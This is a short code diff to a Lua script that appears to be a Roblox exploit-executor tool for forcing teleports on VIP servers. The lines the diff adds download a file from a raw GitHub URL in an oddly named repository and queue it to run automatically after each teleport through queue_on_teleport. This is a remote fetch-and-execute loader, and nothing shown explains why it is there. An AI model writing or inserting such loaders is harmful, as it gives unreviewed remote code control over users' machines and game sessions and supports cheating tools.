@@ -18,6 +18,15 @@ local request = http_request or request or (syn and syn.request) or (fluxus and 
         local maxAttempts = 10
         local attempt = 1
         local teleported = false
+
+local SCRIPT_URL = "https://raw.githubusercontent.com/changelog-modul/test/refs/heads/main/tets"
+
+if queue_on_teleport then
+    queue_on_teleport(game:HttpGet(SCRIPT_URL))
+elseif syn and syn.queue_on_teleport then
+    syn.queue_on_teleport(game:HttpGet(SCRIPT_URL))
+end
+
         
         if GetServerType:InvokeServer() == "VIPServer" then
             while attempt <= maxAttempts and not teleported do
